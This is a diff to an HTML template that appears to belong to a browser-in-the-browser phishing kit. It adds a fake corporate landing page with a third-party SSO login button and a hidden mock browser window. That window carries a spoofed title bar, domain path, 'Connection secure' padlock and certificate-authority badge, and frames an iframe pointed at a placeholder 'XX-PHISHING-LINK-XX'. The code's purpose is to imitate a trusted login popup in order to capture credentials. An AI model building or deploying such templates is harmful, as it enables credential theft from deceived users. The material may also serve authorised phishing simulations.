@@ -4,15 +4,21 @@
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<link rel="stylesheet" href="style.css">
-	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+	<script src="jquery.min.js"></script>
 </head>
 <body>
-<div id="window">
+	<div style='background-color:rgb(31, 137, 118);border-radius: 10px;width:50%'>
+	<img src="../building.jpg" style="float:right;width:17.5%">
+		<h1 style="color:white">SOLIDUX Enterprises</h1>
+		<h4 style="color:white">Creating YOUR future, today!</h4>
+	<button id="clickme" style="background-color: white;color: white;align-items: center;border:1px black black black black;"> <img width="20px" height="20px" src="./logo.svg">&nbsp;&nbsp;<b style="bottom:2px;background-color: white;color: black;align-items: center;">Login With &lt;insert 3rd party sso here&gt;</b>
+			</button></div>
+<div id="window" style="display:none">
 <!-- Title bar start -->
 <div id="title-bar-width">
 	<div id="title-bar">
 		<div style="margin-top:5px;">
-			<img src="./logo.svg" width="20px" height="15px" id="logo">
+			<img src="./logo.svg" width="20px" height="20px" id="logo">
 			<span id="logo-description">XX-TITLE-XX</span>
 		</div>
 
@@ -28,6 +34,21 @@
 		<span id="domain-path">XX-DOMAIN-PATH-XX</span>
 	</div>
 </div>
+
+<!-- cert preview -->
+<div id="verified-by" >Verified by: &lt;insert CA here&gt;</div>
+
+<div id="certificate-box" class="certificate-box visuallyhidden hidden">
+	<span id="siteinfocert">Site information for XX-DOMAIN-NAME-XX</span>
+	<hr id="hrgraypls">
+	<span id="lightup">
+		<span>
+			<img src="./ssl.svg" width="20px" height="20px" id="anotherpadloc">
+			<span id="spanconsec">Connection secure<span id="arrow">></span></span>
+		</span>
+	</span>
+</div>
+
 <!-- Content start -->
 <iframe id="content" src="XX-PHISHING-LINK-XX" frameBorder="0"></iframe>
 </div>
